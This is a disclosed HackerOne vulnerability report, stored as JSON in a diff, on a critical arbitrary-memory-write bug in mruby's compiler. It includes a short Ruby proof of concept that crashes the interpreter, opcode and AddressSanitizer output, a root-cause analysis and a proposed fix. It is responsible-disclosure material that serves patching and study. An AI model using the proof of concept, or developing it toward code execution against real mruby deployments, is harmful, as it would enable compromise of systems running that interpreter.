@@ -1,0 +1,136 @@
+{
+  "id": 226200,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMjYyMDA=",
+  "url": "https://hackerone.com/reports/226200",
+  "title": "OP_SCALL in LHS of a OP_ASGN resulting in arbitrary memory write",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2017-05-04T21:23:52.791Z",
+  "submitted_at": "2017-05-04T21:23:52.791Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "avisaven",
+    "url": "/avisaven",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 15668,
+    "url": "https://hackerone.com/shopify-scripts",
+    "handle": "shopify-scripts",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "shopify-scripts",
+      "twitter_handle": "",
+      "website": "",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2017-05-30T14:36:40.301Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-05-30T02:25:36.551Z",
+  "team_member_agreed_on_going_public_at": "2017-05-30T14:36:40.245Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "# PoC\n\n\tx = 0x4242422a\n\ta = *(_&.__=0)\n\ta = *(_&.__=0)\n    \n# Generated Opcodes\n\tirep 0x60c000014440 nregs=5 nlocals=3 pools=1 syms=0 reps=0\n\tfile: crashes/b.rb\n\t    3 000 OP_LOADL\tR1\tL(0)\t; 1111638570\t; R1:x\n\t    4 001 OP_ARRAY\tR3\tR3\t0\n\t    4 002 OP_LOADI\tR4\t0\n\t    4 003 OP_ARYCAT\tR2\tR3\t\t; R2:a\n\t    5 004 OP_ARRAY\tR2\tR2\t0\t; R2:a R2:a\n\t    5 005 OP_LOADI\tR3\t0\n\t    5 006 OP_ARYCAT\tR1\tR2\t\t; R1:x R2:a\n\t    5 007 OP_MOVE\tR2\tR1\t\t; R2:a R1:x\n\t    5 008 OP_STOP\n\n# AddressSanitizer\n\n    unknown lhs 30\n    unknown lhs 30\n    ASAN:SIGSEGV\n    =================================================================\n    ==17426==ERROR: AddressSanitizer: SEGV on unknown address 0x000042424242 (pc 0x00010e982109 bp 0x7fff5127b430 sp 0x7fff5127b350 T0)\n        #0 0x10e982108 in ary_concat array.c:265\n        #1 0x10e981faf in mrb_ary_concat array.c:284\n        #2 0x10eb9d788 in mrb_vm_exec vm.c:2404\n        #3 0x10eb71298 in mrb_vm_run vm.c:860\n        #4 0x10ebaea21 in mrb_top_run vm.c:2733\n        #5 0x10ecc118a in mrb_load_exec parse.y:5780\n        #6 0x10ecc1ef1 in mrb_load_file_cxt parse.y:5789\n        #7 0x10e97cdfc in main mruby.c:227\n        #8 0x7fff8f70d5c8 in start (/usr/lib/system/libdyld.dylib+0x35c8)\n        #9 0x1  (<unknown module>)\n\n    AddressSanitizer can not provide additional info.\n    SUMMARY: AddressSanitizer: SEGV array.c:265 ary_concat\n    ==17426==ABORTING\n    [2]    17426 abort      ./mruby/bin/mruby crashes/b.rb\n\n# Analysis\nIn `gen_assignment`, `return;` is used for the `default` case when doing the code generation (line 1029 in mrbgems/mruby-compiler/core/codegen.c). When the LHS is an `NODE_SCALL` it goes to the base case. It returns and never gets to the bottom line `if (val) push(val);` which is necessary for the rest of the code to use the correct register. Because it is not pushed, it uses the register below it in the stack, which allows us to manipulate arguments in an unchecked manner to other opcodes.\n\nIf this is used in conjunction with `OP_ARYCAT` from the splat operator, one could point the destination of OP_ARYCAT to a fake RArray with any arbitrary memory as the ptr, resulting in a memory write (I'm currently experimenting with this to corrupt strings and get code execution). \n\n# Solution\nIn order to fix this, either having the error for improper LHS code generation should either be fatal and kill the program, or switching `return;` to `break;` will fix the error. However, in the future, there should be some level of verification the the destination of `OP_ARYCAT` is actually an RArray to prevent it being used in memory corruptions.\n\n# Versions Affected\n\nThe code above was tested on the latest master. The bug itself appears to have been created in commit `88cd807379152ea3fec5f534e5f4d6ebebd53982`.",
+  "weakness": {
+    "id": 6,
+    "name": "Write-what-where Condition"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2017-06-29T02:25:36.609Z",
+  "allow_singular_disclosure_after": -279637233.9278221,
+  "singular_disclosure_allowed": true,
+  "vote_count": 3,
+  "voters": [
+    "eveeez",
+    "0xspade",
+    "spetr0x"
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 3988,
+      "category": "researcher",
+      "content": "Improper code generation and error handling in OP_ASGN leads to arbitrary memory write and code execution.",
+      "updated_at": "2017-05-09T14:55:52.295Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 164426,
+        "username": "avisaven",
+        "name": "Avi Saven",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": "http://www.avisaven.me",
+        "location": "New York",
+        "created_at": "2017-05-01T21:04:59.435Z",
+        "url": "https://hackerone.com/avisaven",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
+          "medium": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
+          "xtralarge": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+        }
+      }
+    }
+  ]
+}
